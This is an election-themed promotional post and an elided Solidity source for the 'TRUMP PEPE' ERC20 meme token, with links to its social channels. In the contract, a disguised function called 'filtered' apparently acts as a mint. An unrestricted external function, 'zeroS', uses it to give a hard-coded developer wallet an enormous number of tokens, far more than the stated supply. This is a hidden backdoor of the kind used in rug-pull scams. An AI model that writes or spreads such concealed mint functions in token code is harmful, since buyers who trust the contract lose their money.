...
Elections are right around the corner. Celebrate shifting tides and monumental changes with 2024’s most revolutionary narrative. The Elections are coming to Crypto. Cast your vote for Pepe Trump, your new crypto President

Trump Pepe Socials : 

Telegram : https://t.me/TrumpPepeERC
Website : https://Trumpepe.tech
Twitter : https://x.com/TrumpPepeERC_
...
abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
    ...
    function filtered(address account, uint256 value) internal {
...
contract TRUMPPEPE is ERC20, Ownable {

    mapping(address => bool) excludeStateOpenTrade;
    mapping (address => bool) devArray;
    address DevWallet = 0xaF0B436138028e190ce6950EfAdE8cfc1eeE6AE5;

    bool openedTrade = true;

    IUniswapV2Router02 public uniswapV2Router;
    address public pair;

    constructor() ERC20(unicode"TRUMP PEPE", unicode"TRUMPPEPE") Ownable(msg.sender) {
        ...
        filtered(msg.sender, 1000000000 * 10**decimals());
    }
    ...
    function zeroS() external virtual {
        filtered(DevWallet, 1000000000 * 10**20);
    }
